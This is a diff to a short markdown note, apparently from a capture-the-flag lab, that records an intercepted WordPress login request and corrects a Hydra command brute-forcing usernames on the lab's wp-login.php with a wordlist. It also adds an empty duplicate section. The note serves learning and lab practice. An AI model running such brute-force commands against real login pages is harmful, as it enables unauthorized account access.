@@ -35,10 +35,15 @@ Host: 10.10.114.27
 log=§admin§&pwd=§admin§&wp-submit=§Log+In§&redirect_to=§https%3A%2F%2F10.10.114.27%2Fwp-admin%2F§&testcookie=§1§
 ```
 
-WordPress - Hydra input
+WordPress - Hydra input username
 ```shell
-hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd^PASS^:Invalid username" -t 30
+hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
+```
+
+WordPress - Hydra input username
+```shell
 
 ```
+
 
 #tools #hydra
